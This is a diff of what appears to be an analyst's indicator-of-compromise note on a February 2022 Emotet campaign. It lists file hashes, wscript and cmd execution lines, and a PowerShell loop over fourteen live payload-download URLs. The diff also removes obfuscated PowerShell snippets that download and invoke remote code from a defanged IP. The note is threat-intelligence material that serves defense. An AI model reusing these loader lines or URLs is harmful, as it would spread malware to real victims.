@@ -1,26 +1,12 @@
 Emotet - e4 - 09.02.2022
 
-.xls 
+.xls 25ee5a0264146304a025034972267713a7810b9759867ae7e272edad48ad983b
 
 .dll da6ce8966d86b8359b27559659ba1b51d41d6bc512667144d9ea9c6c31ec039b
 
 wscript c:\programdata\tjspowj.vbs
 
 cmd.exe /c C:\programdata\uidpjewl.bat
-
-.ps1 
-
-# powershell snippet 0
-$c1 = "(New-Object Net.We"
-$c4 = "bClient).Downlo"
-$c3 = "adString('hxxp://91.240.118.172/ss/ss.png')"
-$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"
-invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"|invoke-expression
-# powershell snippet 1
-(new-object net.webclient).downloadstring("hxxp://91.240.118.172/ss/ss.png")
-
-
-.png 
 
 $mjxdfshdrfgzses4 = "https://youlanda.org/eln-images/n8DPZISf/", "http://rosevideo.net/eln-images/EjdCoMlY8Gy/", "http://vbaint.com/eln-images/H2pPGte8XzENC/", "https://framemakers.us/eln-images/U5W2IGE9m8i9h9r/", "http://niplaw.com/asolidfoundation/yCE9/", "http://robertmchilespe.com/cgi/3f/", "http://vocoptions.net/cgi/ifM9R5ylbVpM8hfR/", "http://missionnyc.org/fonts/JO5/", "http://robertflood.us/eln-images/DGI2YOkSc99XPO/", "http://mpmcomputing.com/fonts/fJJrjqpIY3Bt3Q/", "http://dadsgetinthegame.com/eln-images/tAAUG/", "http://smbservices.net/cgi/JO01ckuwd/", "http://stkpointers.com/eln-images/D/", "http://rosewoodcraft.com/Merchant2/5.00/PGqX/"
 foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
@@ -32,7 +18,6 @@ foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
     }
   }
 }
-
 
 .dll drop
 
@@ -50,8 +35,6 @@ http://dadsgetinthegame.com/eln-images/tAAUG/
 http://smbservices.net/cgi/JO01ckuwd/
 http://stkpointers.com/eln-images/D/
 http://rosewoodcraft.com/Merchant2/5.00/PGqX/
-
-
 
 c2's
 
